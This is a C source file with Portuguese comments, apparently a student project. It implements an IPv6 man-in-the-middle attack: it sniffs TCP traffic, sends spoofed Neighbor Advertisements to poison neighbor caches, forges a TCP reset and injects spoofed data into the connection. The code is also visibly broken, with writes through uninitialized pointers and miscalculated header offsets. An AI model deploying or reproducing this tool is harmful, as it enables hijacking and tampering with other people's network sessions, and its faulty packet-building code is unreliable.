#include<stdio.h> //For standard things
#include<stdlib.h>    //malloc
#include<stdint.h>
#include<string.h>    //memset
#include<netinet/icmp6.h>   //Provides declarations for icmp header
#include<netinet/udp.h>   //Provides declarations for udp header
#include<netinet/tcp.h>   //Provides declarations for tcp header
#include<netinet/ip6.h>    //Provides declarations for ipv6 header
#include<netinet/if_ether.h> // Ethernet header
#include<sys/socket.h>
#include<arpa/inet.h>
#include<linux/if.h>
#include<sys/types.h>
#include<netinet/in.h>
#include<sys/ioctl.h>
#include <linux/if_packet.h>


#define ETH_HDRLEN 14  // tamanho do header ethernet
#define IP6_HDRLEN 40  // tamanho do header ipv6
#define TCP_HDRLEN 20  // tamanho do header tcp

void enviaNeighborAdvertisement(unsigned char* Buffer);
void enviaTcpDados(int portaOrigem, int portaDestino, int numeroSeq, int ackNumber, uint8_t macOrigem[6], 
                    uint8_t macDestino[6], struct in6_addr ipObjetivo, struct in6_addr ipServer);
void enviaTcpClose(int portaOrigem, int portaDestino, int numeroSeq, int ackNumber, uint8_t macOrigem[6], 
                    uint8_t macDestino[6], struct in6_addr ipObjetivo, struct in6_addr ipServer);
uint8_t *allocate_ustrmem (int);
uint16_t checksum (uint16_t *addr, int len);

int sock_raw;
FILE *logfile;
int tcp=0,udp=0,icmp=0,others=0,igmp=0,total=0,i,j;
struct sockaddr_in source,dest;

typedef struct _pktinfo6 pktinfo6;
struct _pktinfo6 {
  struct in6_addr ipi6_addr;
  int ipi6_ifindex;
};

uint16_t tcp6_checksum (struct ip6_hdr iphdr, struct tcphdr tcphdr, uint8_t *payload, int payloadlen)
{
  uint32_t lvalue;
  char buf[655536], cvalue;
  char *ptr;
  int i, chksumlen = 0;

  ptr = &buf[0];  // ptr points to beginning of buffer buf

  // Copy source IP address into buf (128 bits)
  memcpy (ptr, &iphdr.ip6_src, sizeof (iphdr.ip6_src));
  ptr += sizeof (iphdr.ip6_src);
  chksumlen += sizeof (iphdr.ip6_src);

  // Copy destination IP address into buf (128 bits)
  memcpy (ptr, &iphdr.ip6_dst, sizeof (iphdr.ip6_dst));
  ptr += sizeof (iphdr.ip6_dst);
  chksumlen += sizeof (iphdr.ip6_dst);

  // Copy TCP length to buf (32 bits)
  lvalue = htonl (sizeof (tcphdr) + payloadlen);
  memcpy (ptr, &lvalue, sizeof (lvalue));
  ptr += sizeof (lvalue);
  chksumlen += sizeof (lvalue);

  // Copy zero field to buf (24 bits)
  *ptr = 0; ptr++;
  *ptr = 0; ptr++;
  *ptr = 0; ptr++;
  chksumlen += 3;

  // Copy next header field to buf (8 bits)
  memcpy (ptr, &iphdr.ip6_nxt, sizeof (iphdr.ip6_nxt));
  ptr += sizeof (iphdr.ip6_nxt);
  chksumlen += sizeof (iphdr.ip6_nxt);

  // Copy TCP source port to buf (16 bits)
  memcpy (ptr, &tcphdr.th_sport, sizeof (tcphdr.th_sport));
  ptr += sizeof (tcphdr.th_sport);
  chksumlen += sizeof (tcphdr.th_sport);

  // Copy TCP destination port to buf (16 bits)
  memcpy (ptr, &tcphdr.th_dport, sizeof (tcphdr.th_dport));
  ptr += sizeof (tcphdr.th_dport);
  chksumlen += sizeof (tcphdr.th_dport);

  // Copy sequence number to buf (32 bits)
  memcpy (ptr, &tcphdr.th_seq, sizeof (tcphdr.th_seq));
  ptr += sizeof (tcphdr.th_seq);
  chksumlen += sizeof (tcphdr.th_seq);

  // Copy acknowledgement number to buf (32 bits)
  memcpy (ptr, &tcphdr.th_ack, sizeof (tcphdr.th_ack));
  ptr += sizeof (tcphdr.th_ack);
  chksumlen += sizeof (tcphdr.th_ack);

  // Copy data offset to buf (4 bits) and
  // copy reserved bits to buf (4 bits)
  cvalue = (tcphdr.th_off << 4) + tcphdr.th_x2;
  memcpy (ptr, &cvalue, sizeof (cvalue));
  ptr += sizeof (cvalue);
  chksumlen += sizeof (cvalue);

  // Copy TCP flags to buf (8 bits)
  memcpy (ptr, &tcphdr.th_flags, sizeof (tcphdr.th_flags));
  ptr += sizeof (tcphdr.th_flags);
  chksumlen += sizeof (tcphdr.th_flags);

  // Copy TCP window size to buf (16 bits)
  memcpy (ptr, &tcphdr.th_win, sizeof (tcphdr.th_win));
  ptr += sizeof (tcphdr.th_win);
  chksumlen += sizeof (tcphdr.th_win);

  // Copy TCP checksum to buf (16 bits)
  // Zero, since we don't know it yet
  *ptr = 0; ptr++;
  *ptr = 0; ptr++;
  chksumlen += 2;

  // Copy urgent pointer to buf (16 bits)
  memcpy (ptr, &tcphdr.th_urp, sizeof (tcphdr.th_urp));
  ptr += sizeof (tcphdr.th_urp);
  chksumlen += sizeof (tcphdr.th_urp);

  // Copy payload to buf
  memcpy (ptr, payload, payloadlen * sizeof (uint8_t));
  ptr += payloadlen;
  chksumlen += payloadlen;

  // Pad to the next 16-bit boundary
  for (i=0; i<payloadlen%2; i++, ptr++) {
    *ptr = 0;
    ptr++;
    chksumlen++;
  }

  return checksum ((uint16_t *) buf, chksumlen);
}

uint16_t checksum (uint16_t *addr, int len)
{
  int count = len;
  register uint32_t sum = 0;
  uint16_t answer = 0;

  // Sum up 2-byte values until none or only one byte left.
  while (count > 1) {
    sum += *(addr++);
    count -= 2;
  }

  // Add left-over byte, if any.
  if (count > 0) {
    sum += *(uint8_t *) addr;
  }

  // Fold 32-bit sum into 16 bits; we lose information by doing this,
  // increasing the chances of a collision.
  // sum = (lower 16 bits) + (upper 16 bits shifted right 16 bits)
  while (sum >> 16) {
    sum = (sum & 0xffff) + (sum >> 16);
  }

  // Checksum is one's compliment of sum.
  answer = ~sum;

  return (answer);
}


int main()
{
    int saddr_size , data_size;
    struct sockaddr saddr;
    struct in_addr in;

    unsigned char *buffer = (unsigned char *)malloc(65536);

    printf("Starting...\n");

    sock_raw = socket(AF_INET6 , SOCK_RAW , IPPROTO_TCP);
    if(sock_raw < 0)
    {
        printf("Socket Error\n");
        return 1;
    }

    while(1)
    {
        saddr_size = sizeof saddr;
        //Receive a packet
        data_size = recvfrom(sock_raw , buffer , 65536 , 0 , &saddr , &saddr_size);
        if(data_size < 0 )
        {
            printf("Recvfrom error , failed to get packets\n");
            return 1;
        }
		struct ip6_hdr *iph = (struct ip6_hdr*)buffer;
        if(iph && iph->ip6_ctlun.ip6_un1.ip6_un1_nxt == 6){
            printf("entrei\n");
			enviaNeighborAdvertisement(buffer);
            printf("entrei\n");
		}
    }
    close(sock_raw);
    printf("Finished");
    return 0;
}

void copiaArrays(uint8_t *destino, uint8_t *origem){
    int i;
    for(i = 0; i < 6; i++){
        destino[i] = origem[i];
    }
}


void enviaNeighborAdvertisement(unsigned char* Buffer)
{
    printf("primeiro cast");
    struct ether_header *ethernet = (struct ether_header *) Buffer;

    struct ip6_hdr *iph = (struct ip6_hdr *) (Buffer + 14);
printf("cheguei");
    unsigned short iphdrlen = iph->ip6_ctlun.ip6_un1.ip6_un1_nxt*4;

    struct tcphdr *tcph=(struct tcphdr*)(Buffer + iphdrlen);

	// Pegando as informacoes do pacote tcp
    int portaOrigem;
	int portaDestino;
	int numeroSeq = ntohl(tcph->seq);
	int ackNumber = ntohl(tcph->ack_seq);
	
	struct in6_addr ipObjetivo;
	struct in6_addr ipServer;
	uint8_t macOrigem[6];
	uint8_t macDestino[6];
	
	// Se a conexao estiver no meio, pega o ip do host que esta enviando dados
	if(tcph->psh && !tcph->fin){
		ipObjetivo = iph->ip6_src;
		ipServer = iph->ip6_dst;
        copiaArrays(macDestino, ethernet->ether_dhost);
//		macDestino = ethernet->ether_dhost;
		portaOrigem = ntohs(tcph->source);
		portaDestino = ntohs(tcph->dest);
	}
	else{ //Se nao, pega do outro host
		ipObjetivo = iph->ip6_dst;
		ipServer = iph->ip6_src;
        copiaArrays(macDestino, ethernet->ether_shost);
//		macDestino = ethernet->ether_shost;
		portaOrigem = ntohs(tcph->dest);
		portaDestino = ntohs(tcph->source);
	}
	uint8_t *outpack, *options, hoplimit, *psdhdr, *ether_frame;
	struct ip6_hdr iphdr;
	struct ifreq ifr;
	int sd, frame_length, psdhdrlen, cmsglen;
	char *interface;
	struct sockaddr_ll device;
	struct nd_neighbor_advert *na;
	struct msghdr msghdr;
	int NA_HDRLEN = sizeof (struct nd_neighbor_advert);
	int optlen = 8;	
	struct iovec iov[2];
	pktinfo6 *pktinfo;
	struct cmsghdr *cmsghdr1, *cmsghdr2;
	
	strcpy (interface, "enp4s0");
	// Procurar interface
    if ((sd = socket (AF_INET6, SOCK_RAW, IPPROTO_ICMPV6)) < 0) {
    perror ("socket() failed to get socket descriptor for using ioctl() ");
    exit (EXIT_FAILURE);
    }

    // Pegar mac da interface
    memset (&ifr, 0, sizeof (ifr));
    snprintf (ifr.ifr_name, sizeof (ifr.ifr_name), "%s", interface);
    if (ioctl (sd, SIOCGIFHWADDR, &ifr) < 0) {
      perror ("ioctl() failed to get source MAC address ");
      exit (EXIT_FAILURE);
    }
	
	// copiando mac para a variavel
	memcpy (macOrigem, ifr.ifr_hwaddr.sa_data, 6 * sizeof (uint8_t));
	
	memset (&device, 0, sizeof (device));
    if ((device.sll_ifindex = if_nametoindex (interface)) == 0) {
      perror ("if_nametoindex() failed to obtain interface index ");
      exit (EXIT_FAILURE);
    }
	
	// preenchendo os pacotes
    device.sll_family = AF_PACKET;
    memcpy (device.sll_addr, macOrigem, 6 * sizeof (uint8_t));
    device.sll_halen = 6;
	// preenchendo ipv6
	iphdr.ip6_flow = htonl ((6 << 28) | (0 << 20) | 0);
	iphdr.ip6_nxt = IPPROTO_TCP;
	iphdr.ip6_hops = 255;
	iphdr.ip6_src = ipObjetivo;
	iphdr.ip6_dst = ipServer;
	iphdr.ip6_plen = htons (sizeof(struct msghdr));
	
	// preenchendo ethernet
	frame_length = 6 + 6 + 2 + IP6_HDRLEN;
	memcpy (ether_frame, macDestino, 6 * sizeof (uint8_t));
    memcpy (ether_frame + 6, macOrigem, 6 * sizeof (uint8_t));
	ether_frame[12] = ETH_P_IPV6 / 256;
	ether_frame[13] = ETH_P_IPV6 % 256;
	
	// preenchendo icmpv6 com neighbor advertisement 
	na = (struct nd_neighbor_advert *) outpack;
	memset (na, 0, sizeof (*na));
	na->nd_na_hdr.icmp6_type = ND_NEIGHBOR_ADVERT;  // 136 (codigo do neighbor advertisement)
	na->nd_na_hdr.icmp6_code = 0;              
	na->nd_na_hdr.icmp6_cksum = htons(0);      
	na->nd_na_flags_reserved = htonl((1 << 30) + (1 << 29));
	na->nd_na_target = ipServer;          

	options[0] = 2;
	options[1] = optlen / 8;
	int i;
	for (i=0; i<6; i++) {
		options[i+2] = (uint8_t) macOrigem[i];
	}
	memcpy (outpack + NA_HDRLEN, options, optlen * sizeof (uint8_t));
	
	psdhdrlen = 16 + 16 + 4 + 3 + 1 + NA_HDRLEN + optlen;
	
	memset (&msghdr, 0, sizeof (msghdr));
    struct sockaddr_in6 structServer;
    structServer.sin6_family = AF_INET6;
    structServer.sin6_port = htons(portaDestino);
    structServer.sin6_flowinfo = 0;
    structServer.sin6_addr = ipServer;
    structServer.sin6_scope_id = 0;
    msghdr.msg_name = &structServer;  // Destination IPv6 address as struct sockaddr_in6
    msghdr.msg_namelen = sizeof (ipServer);
    memset (&iov, 0, sizeof (iov));
    iov[0].iov_base = (uint8_t *) outpack;  
    iov[0].iov_len = NA_HDRLEN + optlen;
    msghdr.msg_iov = iov;                 
    msghdr.msg_iovlen = 1;  
	cmsglen = CMSG_SPACE (sizeof (int)) + CMSG_SPACE (sizeof (pktinfo));
	msghdr.msg_control = allocate_ustrmem (cmsglen);
    msghdr.msg_controllen = cmsglen;
	hoplimit = 255;
    cmsghdr1 = CMSG_FIRSTHDR (&msghdr);
    cmsghdr1->cmsg_level = IPPROTO_IPV6;
    cmsghdr1->cmsg_type = IPV6_HOPLIMIT;  
    cmsghdr1->cmsg_len = CMSG_LEN (sizeof (int));
    *(CMSG_DATA (cmsghdr1)) = hoplimit;  
  
	memcpy (psdhdr, ipObjetivo.s6_addr, 16 * sizeof (uint8_t));  // Copy to checksum pseudo-header
	memcpy (psdhdr, ipServer.s6_addr, 16 * sizeof (uint8_t));  // Copy to checksum pseudo-header
  
	// Compute ICMPv6 checksum (RFC 2460).
    // psdhdr[0 to 15] = source IPv6 address, set earlier.
    // psdhdr[16 to 31] = destination IPv6 address, set earlier.
     psdhdr[32] = 0;  // Length should not be greater than 65535 (i.e., 2 bytes)
     psdhdr[33] = 0;  // Length should not be greater than 65535 (i.e., 2 bytes)
     psdhdr[34] = (NA_HDRLEN + optlen)  / 256;  // Upper layer packet length
     psdhdr[35] = (NA_HDRLEN + optlen)  % 256;  // Upper layer packet length
     psdhdr[36] = 0;  // Must be zero
     psdhdr[37] = 0;  // Must be zero
     psdhdr[38] = 0;  // Must be zero
     psdhdr[39] = IPPROTO_ICMPV6;
     memcpy (psdhdr + 40, outpack, (NA_HDRLEN + optlen) * sizeof (uint8_t));
     na->nd_na_hdr.icmp6_cksum = checksum ((uint16_t *) psdhdr, psdhdrlen);
	 
	 memcpy (ether_frame + ETH_HDRLEN, &iphdr, IP6_HDRLEN * sizeof (uint8_t));
	 memcpy (ether_frame + ETH_HDRLEN + IP6_HDRLEN, &msghdr, sizeof(struct msghdr) * sizeof (uint8_t));
	
	 //enviar pacote para fazer o spoofing
	 if (sendmsg (sd, ether_frame, 0) < 0) {
       perror ("sendmsg() failed ");
       exit (EXIT_FAILURE);
     }
     close (sd);
	
	 enviaTcpClose(portaDestino, portaOrigem, numeroSeq, ackNumber, macDestino, macOrigem, ipObjetivo, ipServer);
}

void enviaTcpClose(int portaOrigem, int portaDestino, int numeroSeq, int ackNumber, uint8_t macOrigem[6], uint8_t macDestino[6], 
                    struct in6_addr ipObjetivo, struct in6_addr ipServer){
	uint8_t *ethernet, *options, hoplimit, *ether_frame;
	struct ip6_hdr iphdr;
	struct ifreq ifr;
	int sd, frame_length, bytes, *tcp_flags;
	char *interface;
	struct sockaddr_ll device;
	struct tcphdr tcphdr;
	
	strcpy (interface, "enp4s0");
	// Procurar interface
    if ((sd = socket (PF_PACKET, SOCK_RAW, htons (ETH_P_ALL))) < 0) {
    perror ("socket() failed to get socket descriptor for using ioctl() ");
    exit (EXIT_FAILURE);
    }

    // Pegar mac da interface
    memset (&ifr, 0, sizeof (ifr));
    snprintf (ifr.ifr_name, sizeof (ifr.ifr_name), "%s", interface);
    if (ioctl (sd, SIOCGIFHWADDR, &ifr) < 0) {
      perror ("ioctl() failed to get source MAC address ");
      exit(0);
    }
	
	// copiando mac para a variavel
	memcpy (macOrigem, ifr.ifr_hwaddr.sa_data, 6 * sizeof (uint8_t));
	
	memset (&device, 0, sizeof (device));
    if ((device.sll_ifindex = if_nametoindex (interface)) == 0) {
      perror ("if_nametoindex() failed to obtain interface index ");
      exit (EXIT_FAILURE);
    }
	
	// preenchendo os pacotes
    device.sll_family = AF_PACKET;
    memcpy (device.sll_addr, macOrigem, 6 * sizeof (uint8_t));
    device.sll_halen = 6;
	
	// preenchendo ipv6
	iphdr.ip6_flow = htonl ((6 << 28) | (0 << 20) | 0);
	iphdr.ip6_nxt = IPPROTO_TCP;
	iphdr.ip6_hops = 255;
	iphdr.ip6_src = ipObjetivo;
	iphdr.ip6_dst = ipServer;
	iphdr.ip6_plen = htons (TCP_HDRLEN);
	
	// preenchendo tcp
    tcphdr.th_sport = htons (portaOrigem);
    tcphdr.th_dport = htons (portaDestino);
	// incrementar numero de sequencia em 1
	numeroSeq++;
	tcphdr.th_seq = htonl (numeroSeq);
	// incrementar numero de ack em 1
	ackNumber++;
	tcphdr.th_ack = htonl (ackNumber);
	tcphdr.th_x2 = 0;
	tcphdr.th_off = TCP_HDRLEN / 4;

    // Flags (8 bits)

    // FIN flag (1 bit)
    tcp_flags[0] = 0;

    // SYN flag (1 bit)
    tcp_flags[1] = 0;

    // RST flag (1 bit)
    tcp_flags[2] = 1;

    // PSH flag (1 bit)
	tcp_flags[3] = 0;

	// ACK flag (1 bit)
	tcp_flags[4] = 0;

	// URG flag (1 bit)
	tcp_flags[5] = 0;

	// ECE flag (1 bit)
	tcp_flags[6] = 0;

	// CWR flag (1 bit)
	tcp_flags[7] = 0;

	tcphdr.th_flags = 0;
	for (i=0; i<8; i++) {
		tcphdr.th_flags += (tcp_flags[i] << i);
	}

	tcphdr.th_win = htons (65535);
	tcphdr.th_urp = htons (0);
	tcphdr.th_sum = tcp6_checksum (iphdr, tcphdr, (uint8_t *) 0, 0);
	
	// preenchendo ethernet
	frame_length = 6 + 6 + 2 + IP6_HDRLEN + TCP_HDRLEN;
	memcpy (ether_frame, macDestino, 6 * sizeof (uint8_t));
    memcpy (ether_frame + 6, macOrigem, 6 * sizeof (uint8_t));
	ether_frame[12] = ETH_P_IPV6 / 256;
	ether_frame[13] = ETH_P_IPV6 % 256;
	
	memcpy (ether_frame + ETH_HDRLEN, &iphdr, IP6_HDRLEN * sizeof (uint8_t));
    memcpy (ether_frame + ETH_HDRLEN + IP6_HDRLEN, &tcphdr, TCP_HDRLEN * sizeof (uint8_t));
	
	if ((sd = socket (PF_PACKET, SOCK_RAW, htons (ETH_P_ALL))) < 0) {
      perror ("socket() failed ");
      exit (EXIT_FAILURE);
    }

    // envia pacote
    if ((bytes = sendto (sd, ether_frame, frame_length, 0, (struct sockaddr *) &device, sizeof (device))) <= 0) {
      perror ("sendto() failed");
      exit (EXIT_FAILURE);
    }
    close (sd);
	enviaTcpDados(portaOrigem, portaDestino, numeroSeq-1, ackNumber-1, macOrigem, macDestino, ipObjetivo, ipServer);
}

void enviaTcpDados(int portaOrigem, int portaDestino, int numeroSeq, int ackNumber, uint8_t macOrigem[6], uint8_t macDestino[6],
                    struct in6_addr ipObjetivo, struct in6_addr ipServer){
	uint8_t *ethernet, *options, hoplimit, *ether_frame;
	struct ip6_hdr iphdr;
	struct ifreq ifr;
	int sd, frame_length, bytes;
	char *interface;
	struct sockaddr_ll device;
	struct tcphdr tcphdr;
	char *payload;
	int payloadlen, *tcp_flags;
	
	strcpy (interface, "enp4s0");
	strcpy (payload, "Mensagem teste");
	payloadlen = strlen (payload);
	// Procurar interface
    if ((sd = socket (PF_PACKET, SOCK_RAW, htons (ETH_P_ALL))) < 0) {
    perror ("socket() failed to get socket descriptor for using ioctl() ");
    exit (EXIT_FAILURE);
    }

    // Pegar mac da interface
    memset (&ifr, 0, sizeof (ifr));
    snprintf (ifr.ifr_name, sizeof (ifr.ifr_name), "%s", interface);
    if (ioctl (sd, SIOCGIFHWADDR, &ifr) < 0) {
      perror ("ioctl() failed to get source MAC address ");
      exit (EXIT_FAILURE);
    }
	
	// copiando mac para a variavel
	memcpy (macOrigem, ifr.ifr_hwaddr.sa_data, 6 * sizeof (uint8_t));
	
	memset (&device, 0, sizeof (device));
    if ((device.sll_ifindex = if_nametoindex (interface)) == 0) {
      perror ("if_nametoindex() failed to obtain interface index ");
      exit (EXIT_FAILURE);
    }
	
	// preenchendo os pacotes
    device.sll_family = AF_PACKET;
    memcpy (device.sll_addr, macOrigem, 6 * sizeof (uint8_t));
    device.sll_halen = 6;
	
	// preenchendo ipv6
	iphdr.ip6_flow = htonl ((6 << 28) | (0 << 20) | 0);
	iphdr.ip6_nxt = IPPROTO_TCP;
	iphdr.ip6_hops = 255;
	iphdr.ip6_src = ipObjetivo;
	iphdr.ip6_dst = ipServer;
	iphdr.ip6_plen = htons (TCP_HDRLEN + payloadlen);
	
	// preenchendo tcp
    tcphdr.th_sport = htons (portaOrigem);
    tcphdr.th_dport = htons (portaDestino);
	// incrementar numero de sequencia em 1
	numeroSeq++;
	tcphdr.th_seq = htonl (numeroSeq);
	// incrementar numero de ack em 1
	ackNumber++;
	tcphdr.th_ack = htonl (ackNumber);
	tcphdr.th_x2 = 0;
	tcphdr.th_off = TCP_HDRLEN / 4;

    // Flags (8 bits)

    // FIN flag (1 bit)
    tcp_flags[0] = 0;

    // SYN flag (1 bit)
    tcp_flags[1] = 0;

    // RST flag (1 bit)
    tcp_flags[2] = 0;

    // PSH flag (1 bit)
	tcp_flags[3] = 1;

	// ACK flag (1 bit)
	tcp_flags[4] = 1;

	// URG flag (1 bit)
	tcp_flags[5] = 0;

	// ECE flag (1 bit)
	tcp_flags[6] = 0;

	// CWR flag (1 bit)
	tcp_flags[7] = 0;

	tcphdr.th_flags = 0;
	for (i=0; i<8; i++) {
		tcphdr.th_flags += (tcp_flags[i] << i);
	}

	tcphdr.th_win = htons (65535);
	tcphdr.th_urp = htons (0);
	tcphdr.th_sum = tcp6_checksum (iphdr, tcphdr, (uint8_t *) payload, payloadlen);
	
	// preenchendo ethernet
	frame_length = 6 + 6 + 2 + IP6_HDRLEN + TCP_HDRLEN + payloadlen;
	memcpy (ether_frame, macDestino, 6 * sizeof (uint8_t));
    memcpy (ether_frame + 6, macOrigem, 6 * sizeof (uint8_t));
	ether_frame[12] = ETH_P_IPV6 / 256;
	ether_frame[13] = ETH_P_IPV6 % 256;
	
	memcpy (ether_frame + ETH_HDRLEN, &iphdr, IP6_HDRLEN * sizeof (uint8_t));
    memcpy (ether_frame + ETH_HDRLEN + IP6_HDRLEN, &tcphdr, TCP_HDRLEN * sizeof (uint8_t));
	memcpy (ether_frame + ETH_HDRLEN + IP6_HDRLEN + TCP_HDRLEN, payload, payloadlen * sizeof (uint8_t));
	
	if ((sd = socket (PF_PACKET, SOCK_RAW, htons (ETH_P_ALL))) < 0) {
      perror ("socket() failed ");
      exit (EXIT_FAILURE);
    }

    // envia pacote
    if ((bytes = sendto (sd, ether_frame, frame_length, 0, (struct sockaddr *) &device, sizeof (device))) <= 0) {
      perror ("sendto() failed");
      exit (EXIT_FAILURE);
    }
    close (sd);
}

uint8_t * allocate_ustrmem (int len)
{
  void *tmp;

  if (len <= 0) {
    fprintf (stderr, "ERROR: Cannot allocate memory because len = %i in allocate_ustrmem().\n", len);
    exit (EXIT_FAILURE);
  }

  tmp = (uint8_t *) malloc (len * sizeof (uint8_t));
  if (tmp != NULL) {
    memset (tmp, 0, len * sizeof (uint8_t));
    return (tmp);
  } else {
    fprintf (stderr, "ERROR: Cannot allocate memory for array allocate_ustrmem().\n");
    exit (EXIT_FAILURE);
  }
}

